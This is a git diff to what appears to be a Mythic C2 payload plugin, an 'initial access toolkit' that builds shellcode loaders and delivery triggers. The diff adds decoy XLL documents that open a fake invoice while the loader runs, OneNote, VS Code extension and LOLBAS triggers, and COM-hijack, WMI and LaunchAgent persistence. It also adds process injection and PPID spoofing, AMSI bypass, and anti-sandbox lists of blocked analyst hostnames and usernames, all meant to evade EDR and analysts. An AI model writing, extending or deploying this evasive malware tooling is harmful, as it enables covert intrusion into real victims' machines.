@@ -45,7 +45,7 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "create_payload_trigger", "create_bat_payload_trigger",
     "create_msi_payload_trigger", "create_clickonce_trigger",
     "create_msc_explorer_trigger", "create_html_smuggling_trigger",
-    "create_clickfix_trigger",
+    "create_clickfix_trigger", "create_onenote_trigger",
     "build_7z", "build_zip", "build_iso", "build_electron_installer", "build_vhd",
     "build_appinstaller", "build_msix_structure",
     "self_sign_payload", "get_remote_cert_details", "sign_with_provided_cert",
@@ -67,12 +67,24 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "create_qr_html_trigger",
     "create_encrypted_html_smuggling_trigger", "create_geofenced_html_smuggling_trigger",
     "salt_text",
+    "create_vscode_ext_trigger",
     # Linux / macOS initial access triggers
     "create_bash_trigger",
     "create_desktop_trigger",
     "create_applescript_trigger",
     "create_command_trigger",
     "create_pkg_trigger",
+    "create_appbundle_trigger",
+    "create_dmg_trigger",
+    # LOLBAS triggers
+    "create_cmstp_trigger",
+    "create_regsvr32_trigger",
+    "create_xsl_trigger",
+    "create_installutil_trigger",
+    # Standalone persistence plugins
+    "create_com_hijack_dropper",
+    "create_wmi_subscription",
+    "create_launchagent",
 ]
 _missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
 if _missing:
@@ -167,7 +179,7 @@ ENCODING_METHODS = {
     "ALPHA32" : "alpha",
     "ASCII85" : "ascii85",
     "BASE64"  : "base64",
-    "WORDS256": "words",
+    "WORDS256": "words256",
     "NONE"    : ""
 }
 
@@ -187,10 +199,6 @@ ENCODING_TYPE_MAP = {
     "WORDS256": 4,
 }
 
-#
-# Commented out to reduce confusion
-# uncomment the ones that you will use on your custom loader
-#
 SHELLCODE_FORMAT = {
     "C"          : "c",
     "CSharp"     : "csharp",
@@ -328,7 +336,7 @@ DEFAULT_BLOCKED_PROCESSES = [
 class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
-    semver = "0.1.0"
+    semver = "0.1.2"
     
     note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"
 
@@ -342,7 +350,8 @@ class ErebusWrapper(PayloadType):
     wrapper = True
     wrapped_payloads = ["merlin", "kharon", "ceos"
                         "sliver", "apollo", "athena",
-                        "xenon", "nimplant", "hannibal"]
+                        "xenon", "nimplant", "hannibal",
+                        "starburst"]
     c2_profiles = []
 
     # Plugin validation flag - run only once at startup
@@ -357,6 +366,7 @@ class ErebusWrapper(PayloadType):
     build_parameters = [
         BuildParameter(
             name="0.0 Target OS",
+            group_name="0 - Target Platform",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Target operating system. Selects the appropriate trigger set. "
@@ -368,6 +378,7 @@ class ErebusWrapper(PayloadType):
 
         BuildParameter(
             name = "0.0 Main Payload Type",
+            group_name="0 - Target Platform",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the main payload type (Shellcode Loader or DLL Hijack)
 NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
@@ -378,6 +389,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0a Enable Custom Shellcode",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Upload custom raw shellcode from an external C2 (e.g. Cobalt Strike, Havoc, Sliver). "
@@ -391,6 +403,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0b Custom Shellcode File",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.File,
             description = (
                 "Raw shellcode blob to use instead of the Mythic-wrapped payload "
@@ -404,6 +417,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0c Enable Donut",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Convert a PE (.exe/.dll) or .NET assembly to raw shellcode via Donut "
@@ -418,6 +432,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0d Donut Input File",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.File,
             description = "PE (.exe/.dll) or .NET assembly to convert to shellcode via Donut.",
             required = False,
@@ -428,6 +443,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0e Donut Architecture",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Target architecture for Donut shellcode generation.",
             choices = ["x64", "x86", "x86+x64"],
@@ -440,6 +456,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0f Donut Args",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.String,
             description = "Optional command-line arguments passed to the Donut payload at runtime.",
             default_value = "",
@@ -451,6 +468,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0g Build All Configurations",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Build all trigger types and all container types "
@@ -464,6 +482,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.1 Loader Type",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the type of loader to use",
             choices = ["ClickOnce", "Shellcode Loader", "VM Loader"],
@@ -476,6 +495,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.2 Loader Format",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Select the loader's output format. "
@@ -498,6 +518,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.2a Loader Architecture",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the target architecture for the loader",
             choices = ["x64", "x86"],
@@ -509,7 +530,43 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         ),
 
         BuildParameter(
+            name = "0.2b XLL Ingest File",
+            group_name="2 - Windows Loader",
+            parameter_type = BuildParameterType.File,
+            description = (
+                "Optional: upload a legitimate file (e.g. a real .xlsx invoice) to embed in the XLL. "
+                "On xlAutoOpen the XLL drops this file to %%TEMP%% and opens it in Excel so the victim "
+                "sees plausible content while the loader executes in the background. "
+                "Leave empty to disable the ingestor."
+            ),
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.2 Loader Format", operand=HideConditionOperand.NotEQ, value="xll"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.2c XLL Ingest Filename",
+            group_name="2 - Windows Loader",
+            parameter_type = BuildParameterType.String,
+            description = (
+                "Filename used when dropping the embedded file to %%TEMP%% (e.g. 'Q2_Invoice.xlsx'). "
+                "Match the delivery pretext. Ignored when no ingest file is uploaded."
+            ),
+            default_value = "document.xlsx",
+            required = False,
+            hide_conditions = [
+                HideCondition(name="0.2 Loader Format", operand=HideConditionOperand.NotEQ, value="xll"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ]
+        ),
+
+        BuildParameter(
             name = "0.3 Loader Build Configuration",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the loader's build config. Release is the shippable mode: symbols stripped, rich header scrubbed, PE timestamp zeroed, debug directory blob wiped. Debug keeps symbols and leaves forensic metadata intact - use only for local testing.",
             choices = ["release", "debug", "test"],
@@ -522,6 +579,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.3 ClickOnce Build Configuration",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the loader's build config.",
             choices = ["debug", "release"],
@@ -534,6 +592,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.3a ClickOnce Architecture",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the target architecture for the ClickOnce loader",
             choices = ["x64", "x86"],
@@ -547,17 +606,21 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # Shellcode Loader Injection Configuration
         BuildParameter(
             name = "0.4 Shellcode Loader - Injection Type",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the injection technique for the Shellcode Loader:
 1 = NtMapViewOfSection (Remote)
 2 = CreateFiber (Self)
 3 = EarlyCascade (Remote)
-4 = PoolParty (Remote)
+4 = PoolParty - RemoteTpDirectInsertion (Remote)
 5 = NtQueueApcThread (Remote)
 6 = ModuleStomp (Self)
 7 = KernelCallbackTable (Self)
-8 = TxfHollow (Remote)""",
-            choices = ["1", "2", "3", "4", "5", "6", "7", "8"],
+8 = TxfHollow (Remote)
+9 = TpJobObjectApc - RemoteTpJobDirectInsertion (Remote)
+10 = ProcessHollow - Unmap+remap target image (Remote) [T1055.012]
+11 = FunctionStomp - Overwrite ntdll export prologue with JMP trampoline (Self) [T1055]""",
+            choices = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"],
             default_value = "3",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
@@ -569,6 +632,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # VM Loader Injection Configuration (self-injection only)
         BuildParameter(
             name = "0.4a VM Loader - Injection Type",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the self-injection technique for the VM Loader:
 2 = CreateFiber (Self)
@@ -585,6 +649,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ── Linux Loader ──────────────────────────────────────────────────────
         BuildParameter(
             name="0.1-L Linux Loader Type",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Linux loader output format. ELF = standalone executable. SO = shared object (for LD_PRELOAD delivery).",
             choices=["ELF", "Shared Object"],
@@ -596,6 +661,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.2a-L Linux Architecture",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Target CPU architecture for the Linux loader.",
             choices=["x86_64", "aarch64"],
@@ -607,6 +673,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.3-L Linux Build Configuration",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Release strips symbols and minimises binary size. Debug retains symbols for local testing.",
             choices=["release", "debug"],
@@ -618,6 +685,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.4-L Linux Injection Type",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Linux shellcode execution technique:\n"
@@ -635,6 +703,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5-L Linux Enable Guardrails",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Enable compile-time anti-analysis checks in the Linux loader.",
             default_value=False,
@@ -645,6 +714,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5a-L Linux Check ptrace",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect active ptrace attachment by reading /proc/self/status TracerPid.",
             default_value=True,
@@ -656,6 +726,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5b-L Linux Check Container",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect Docker/LXC/container execution via /proc/self/cgroup keyword scan.",
             default_value=True,
@@ -667,6 +738,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5c-L Linux Blocked Hostnames",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated hostname substrings to block (case-insensitive).",
             default_value="sandbox,malware,cuckoo,any.run",
@@ -678,6 +750,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5d-L Linux Blocked Usernames",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated username substrings to block (case-insensitive).",
             default_value="analyst,malware,sandbox,user",
@@ -689,6 +762,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5e-L Linux Process Masquerade",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Rename the loader process via prctl(PR_SET_NAME) to hide it in ps/top.",
             default_value=True,
@@ -699,6 +773,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5f-L Linux Masquerade Name",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.String,
             description="Process name to masquerade as (default mimics a kernel worker thread).",
             default_value="[kworker/u:0]",
@@ -711,6 +786,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ── macOS Loader ───────────────────────────────────────────────────────
         BuildParameter(
             name="0.1-M macOS Loader Type",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="macOS loader output format. MachO = standalone executable. Dylib = dynamic library.",
             choices=["MachO", "Dylib"],
@@ -722,6 +798,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.2a-M macOS Architecture",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Target CPU architecture. 'universal' produces a fat binary (x86_64 + arm64) via lipo.",
             choices=["x86_64", "arm64", "universal"],
@@ -733,6 +810,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.3-M macOS Build Configuration",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Release strips symbols. Debug retains them for local testing.",
             choices=["release", "debug"],
@@ -744,6 +822,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.4-M macOS Injection Type",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "macOS shellcode execution technique:\n"
@@ -761,6 +840,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5-M macOS Enable Guardrails",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Enable compile-time anti-analysis checks in the macOS loader.",
             default_value=False,
@@ -771,6 +851,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5a-M macOS Deny Attach",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Call ptrace(PT_DENY_ATTACH) at startup - kills any debugger that subsequently attaches.",
             default_value=True,
@@ -782,6 +863,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5b-M macOS Check Debug",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect active debugger via sysctl KERN_PROC P_TRACED flag.",
             default_value=True,
@@ -793,6 +875,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5c-M macOS Check Timing",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect single-stepping via mach_absolute_time loop timing (> 500 ms threshold).",
             default_value=False,
@@ -804,6 +887,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5d-M macOS Blocked Hostnames",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated hostname substrings to block (case-insensitive).",
             default_value="sandbox,malware,analyst",
@@ -815,6 +899,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5e-M macOS Blocked Usernames",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated username substrings to block (case-insensitive).",
             default_value="analyst,malware,sandbox",
@@ -827,6 +912,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ── Windows-only ────────────────────
         BuildParameter(
             name = "0.5 Shellcode Loader - Target Process",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.String,
             description = "Target process for remote injection",
             default_value = "C:\\Windows\\System32\\notepad.exe",
@@ -836,13 +922,56 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="6"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="7"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="11"),
                 HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
+        ),
+
+        # PPID Spoofing Configuration
+        BuildParameter(
+            name="0.5 PPID Spoof",
+            group_name="2 - Windows Loader",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Spoof the parent process ID when spawning the target process (T1134.004).\n"
+                "The process tree in Task Manager and EDR telemetry will show the spoofed\n"
+                "parent as the creator instead of the actual loader process.\n"
+                "Only effective for remote injection types that spawn a new process (1, 3, 5, 8, 10)."
+            ),
+            default_value=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="VM Loader"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="4"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="6"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="7"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="9"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="11"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5 PPID Spoof Target",
+            group_name="2 - Windows Loader",
+            parameter_type=BuildParameterType.ChooseOne,
+            description=(
+                "Process whose PID is used as the spoofed parent.\n"
+                "The loader will find a running instance of this process by name hash\n"
+                "and open it with PROCESS_CREATE_PROCESS rights."
+            ),
+            choices=["explorer.exe", "svchost.exe", "RuntimeBroker.exe", "sihost.exe", "winlogon.exe"],
+            default_value="explorer.exe",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+                HideCondition(name="0.5 PPID Spoof", operand=HideConditionOperand.EQ, value=False),
+            ],
         ),
 
         # Guardrails Configuration
         BuildParameter(
             name = "0.5a Enable Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable guardrails (environment and anti-debugging checks) for the loader",
             default_value = False,
@@ -853,6 +982,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5b Check IsDebuggerPresent",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
             default_value = True,
@@ -864,6 +994,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5c Check Remote Debugger",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for remote debugger via NtQueryInformationProcess",
             default_value = True,
@@ -875,6 +1006,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5d Check Debugger Processes",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for known debugger and analysis tool processes",
             default_value = True,
@@ -886,6 +1018,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5e Check Hardware Breakpoints",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for hardware breakpoints in debug registers",
             default_value = True,
@@ -897,6 +1030,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f Check Timing Anomalies",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
             default_value = False,
@@ -908,6 +1042,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f1 Check Sandbox Environment",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Detect VMs and sandboxes (hypervisor CPUID, low resources, sandbox artifacts, no recent user activity)",
             default_value = False,
@@ -919,6 +1054,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f2 Check System Uptime",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Reject environments where system uptime is below the configured minimum. "
@@ -935,6 +1071,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f3 Minimum Uptime Seconds",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Minimum system uptime in seconds required to proceed (default: 300 = 5 minutes).",
             default_value = "300",
@@ -948,6 +1085,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f4 Check Screen Resolution",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Require a minimum screen resolution of 1280x1024. Sandboxes and analyst VMs "
@@ -963,6 +1101,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f5 Check Secure Boot",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Require UEFI Secure Boot to be enabled (registry: HKLM\\SYSTEM\\CurrentControlSet\\"
@@ -979,6 +1118,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5g Hostname Whitelist",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
             default_value = "",
@@ -990,6 +1130,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5h Block Analysis Hostnames",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
             default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
@@ -1001,6 +1142,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5i Block Analysis Usernames",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
             default_value = "analyst,malware,sandbox,user,admin",
@@ -1012,6 +1154,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5j IP Whitelist",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
             default_value = "",
@@ -1023,6 +1166,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5k IP Blacklist",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
             default_value = "192.168.122.,172.16.,127.",
@@ -1034,6 +1178,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5l Domain Whitelist",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
             default_value = "",
@@ -1048,13 +1193,17 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # loader (Shellcode Loader + DLL Hijack); ClickOnce is unaffected.
         BuildParameter(
             name = "0.5m Syscall Backend",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Syscall dispatch layer for Nt* calls.\n"
-                "TartarusGate: built-in indirect syscall shim page.\n"
-                "SysWhispers3: generated Sw3Nt* stubs."
+                "TartarusGate: built-in indirect syscall shim page (x64).\n"
+                "SysWhispers3: generated Sw3Nt* stubs (x64).\n"
+                "Heaven's Gate: 32-bit WoW64 far-call to CS:0x33 + native syscall. "
+                "Requires Loader Architecture = x86. Issues 64-bit syscalls from a "
+                "32-bit process without patching any DLL."
             ),
-            choices = ["TartarusGate", "SysWhispers3"],
+            choices = ["TartarusGate", "SysWhispers3", "Heaven's Gate"],
             default_value = "TartarusGate",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
@@ -1065,6 +1214,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5n Callstack Spoofing",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Enable Callstack Spoofing"
@@ -1085,6 +1235,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # into the host process - defaults cover every Win32 process.
         BuildParameter(
             name = "0.5o Callstack Spoof Modules",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.String,
             description = (
                 "Comma-separated module names scanned for the `add rsp, 0x68; ret` gadget. "
@@ -1105,6 +1256,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # Sleep Obfuscation Configuration
         BuildParameter(
             name = "0.5p Sleep Obfuscation",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Pre-injection dwell mode.\n"
@@ -1113,9 +1265,11 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 "Ekko-lite: Timer + XOR-encrypt non-.text PE sections during wait (hides shellcode from memory scanners).\n"
                 "Exhaustion: Fibonacci burn + 100k CloseHandle API hammering + 100 MB memory touch, then WaitableTimer wait. "
                 "Exhausts emulator instruction/syscall budgets so automated sandboxes time out before behaviour is recorded. "
-                "Recommended base dwell: 90000 ms (90 seconds)."
+                "Recommended base dwell: 90000 ms (90 seconds).\n"
+                "Full Ekko: Ekko-lite + XOR stack return addresses in-place + wipe PE DOS/NT headers during wait. "
+                "Defeats stack-walk based memory scanners and PE header signature checks."
             ),
-            choices = ["None", "Timer", "Ekko-lite", "Exhaustion"],
+            choices = ["None", "Timer", "Ekko-lite", "Exhaustion", "Full Ekko"],
             default_value = "None",
             required = False,
             hide_conditions = [
@@ -1127,6 +1281,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5v Single Instance",
+            group_name="7 - Loader Options",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Create a named Global\\ mutex on startup to prevent duplicate beacons. "
@@ -1144,6 +1299,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5q Sleep Base MS",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.String,
             description = "Base dwell in milliseconds before injection. Actual dwell = base + random(0, jitter).",
             default_value = "5000",
@@ -1157,6 +1313,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5r Sleep Jitter MS",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.String,
             description = "Maximum random milliseconds added to the base dwell. Set to 0 for fixed dwell.",
             default_value = "3000",
@@ -1170,15 +1327,18 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5s AMSI Bypass Type",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "AMSI bypass depth:\n"
